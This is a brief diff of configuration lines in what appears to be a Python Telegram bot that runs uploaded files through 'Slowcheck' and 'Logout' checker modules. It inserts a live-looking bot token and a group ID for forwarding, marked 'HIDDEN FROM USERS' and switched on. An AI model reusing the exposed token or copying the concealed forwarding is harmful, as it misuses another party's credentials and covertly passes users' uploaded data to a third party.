@@ -16,11 +16,11 @@ from Slowcheck import process_file_and_check as slow_check
 from Logout import process_file_and_check as logout_check
 
 # --- Config ---
-TOKEN = "8340045274:AAHGNYpVIGh8B4myxDOan4_CiNqlqwQbEC4"  # Replace with your actual bot token
+TOKEN = "8270743184:AAEri7VgKj8A-En0R_L9y88fkcPc6iBCK_s"  # Replace with your actual bot token
 UPLOAD_DIR = "uploads"
 
 # Group configuration - Add your group chat ID here (HIDDEN FROM USERS)
-TARGET_GROUP_ID = "-1001234567890"  # Replace with your group chat ID (include the minus sign)
+TARGET_GROUP_ID = "-1003072651464"  # Replace with your group chat ID (include the minus sign)
 SEND_TO_GROUP = True  # Set to False to disable group sending
 
 # Global dictionary to track active processes
